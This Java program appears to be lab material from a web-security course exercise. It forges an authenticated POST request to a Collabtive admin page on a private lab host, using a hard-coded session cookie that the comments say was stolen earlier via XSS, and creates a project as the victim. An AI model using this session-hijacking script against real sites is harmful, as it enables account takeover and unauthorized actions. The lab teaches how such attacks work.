import java.io.*;
import java.net.*;

public class HTTPSimpleForge {
    public static void main(String[] args) throws IOException {
        try {
            int responseCode;
            InputStream responseIn=null;
            // URL to be forged.
            URL url = new URL ("http://192.168.5.145/XSS/Collabtive/admin.php?action=addpro");
            // URLConnection instance is created to further parameterize a
            // resource request past what the state members of URL instance
            // can represent.
            URLConnection urlConn = url.openConnection();
            if (urlConn instanceof HttpURLConnection) {
                urlConn.setConnectTimeout(60000);
                urlConn.setReadTimeout(90000);
            }
            // addRequestProperty method is used to add HTTP Header Information.
            // Here we add User-Agent HTTP header to the forged HTTP packet.
            // Add other necessary HTTP Headers yourself. Cookies should be stolen
            // using the method in task3.
            urlConn.addRequestProperty("User-agent","Sun JDK 1.6");
            urlConn.addRequestProperty("Cookie","PHPSESSID=irjgts472phu02rd2st72vbg72");
            urlConn.addRequestProperty("Accept-Language","en-us,en;q=0.5");
            urlConn.addRequestProperty("Accept-Encoding","gzip, deflate");
            urlConn.addRequestProperty("Accept-Charset","ISO-8859-1,utf-8;q=0.7,*;q=0.7");

            //HTTP Post Data which includes the information to be sent to the server.
            String data="name=ForgeTask&desc=Affected&end=23.11.2011&budget=721&assignto%5B%5D=3&assignme=1";
            // DoOutput flag of URL Connection should be set to true
            // to send HTTP POST message.
            urlConn.setDoOutput(true);
            // OutputStreamWriter is used to write the HTTP POST data
            // to the url connection.
            OutputStreamWriter wr = new OutputStreamWriter(urlConn.getOutputStream());
            wr.write(data);
            wr.flush();
            // HttpURLConnection a subclass of URLConnection is returned by
            // url.openConnection() since the url is an http request.
            if (urlConn instanceof HttpURLConnection) {
                HttpURLConnection httpConn = (HttpURLConnection) urlConn;
                // Contacts the web server and gets the status code from
                // HTTP Response message.
                responseCode = httpConn.getResponseCode();
                System.out.println("Response Code = " + responseCode);
                // HTTP status code HTTP_OK means the response was
                // received sucessfully.
                if (responseCode == HttpURLConnection.HTTP_OK) {
                    // Get the input stream from url connection object.
                    responseIn = urlConn.getInputStream();
                    // Create an instance for BufferedReader
                    // to read the response line by line.
                    BufferedReader buf_inp = new BufferedReader(
                        new InputStreamReader(responseIn));
                        String inputLine;
                    while((inputLine = buf_inp.readLine())!=null) {
                        System.out.println(inputLine);
                    }
                }
            }
        } 
        catch (MalformedURLException e) {
            e.printStackTrace();
        }
    }
}